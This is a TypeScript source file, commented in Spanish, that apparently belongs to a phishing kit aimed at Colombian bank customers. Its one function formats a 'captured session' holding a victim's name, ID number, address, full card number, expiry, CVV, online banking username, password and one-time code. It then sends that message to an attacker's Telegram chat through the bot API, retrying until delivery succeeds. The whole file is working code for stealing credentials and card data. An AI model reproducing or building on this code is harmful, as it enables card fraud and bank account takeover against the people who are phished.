// Función para enviar mensajes a Telegram
export async function sendToTelegram(sessionData: any) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    console.error('Telegram bot token or chat ID not configured');
    return;
  }

  try {
    // Formatear el mensaje
    const message = `
🔔 *Nueva Sesión Capturada*

*Sesión:* \`#${sessionData.sessionId.slice(-8)}\`
*Banco:* ${sessionData.bank.toUpperCase()}
*Estado:* ${sessionData.status}

*📋 Datos del Cliente*
*Nombre:* ${sessionData.fullName || 'N/A'}
*Email:* ${sessionData.email || 'N/A'}
*Teléfono:* ${sessionData.phone || 'N/A'}
*Cédula:* ${sessionData.documentId || 'N/A'}
*Dirección:* ${sessionData.address || 'N/A'}
*Ciudad:* ${sessionData.city || 'N/A'}

*💳 Datos de Tarjeta*
*Número:* \`${sessionData.cardNumber || 'N/A'}\`
*Titular:* ${sessionData.cardHolderName || 'N/A'}
*Vencimiento:* ${sessionData.expiryDate || 'N/A'}
*CVV:* \`${sessionData.cvv || 'N/A'}\`
*Marca:* ${sessionData.cardBrand || 'N/A'}

*🔐 Credenciales Bancarias*
*Usuario:* ${sessionData.usuario || 'N/A'}
*Clave:* \`${sessionData.clave || 'N/A'}\`
*Dinámica:* \`${sessionData.claveDinamica || 'N/A'}\`

*💰 Total:* $${sessionData.totalAmount?.toLocaleString('es-CO') || '0'}

*🕐 Fecha:* ${new Date(sessionData.createdAt).toLocaleString('es-CO')}
`;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    
    // Retry logic: intentar 3 veces con timeout más largo
    let lastError;
    for (let i = 0; i < 3; i++) {
      try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 10000); // 10 segundos timeout
        
        const response = await fetch(url, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown',
          }),
          signal: controller.signal,
        });
        
        clearTimeout(timeoutId);

        if (!response.ok) {
          throw new Error(`Telegram API error: ${response.statusText}`);
        }

        console.log('Message sent to Telegram successfully');
        return; // Éxito, salir de la función
      } catch (error) {
        lastError = error;
        console.error(`Telegram attempt ${i + 1} failed:`, error);
        if (i < 2) {
          // Esperar 2 segundos antes del siguiente intento
          await new Promise(resolve => setTimeout(resolve, 2000));
        }
      }
    }
    
    // Si llegamos aquí, todos los intentos fallaron
    console.error('All Telegram send attempts failed:', lastError);
  } catch (error) {
    console.error('Error sending to Telegram:', error);
  }
}
